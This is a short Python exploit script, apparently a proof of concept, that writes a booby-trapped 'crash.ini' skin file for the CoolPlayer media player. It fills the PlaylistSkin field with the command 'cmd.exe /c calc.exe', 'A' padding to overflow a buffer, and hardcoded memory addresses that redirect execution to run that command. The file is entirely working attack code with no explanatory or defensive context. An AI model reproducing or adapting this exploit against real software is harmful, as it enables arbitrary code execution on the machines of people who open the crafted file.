import struct

if __name__ == '__main__':
    with open("crash.ini", "w") as f:
        f.write("[CoolPlayer Skin]\n")
        f.write("PlaylistSkin=")

        command = "cmd.exe /c calc.exe"
        f.write(command)
        f.write("\x41" * (1056 - len(command)))
        f.write(struct.pack("<I", 0x7c8623ad))
        f.write(struct.pack("<I", 0x7c81cafa))
        f.write("BBBB")
        f.write(struct.pack("<I", 0xFFFFFFFF))

    print("Done")
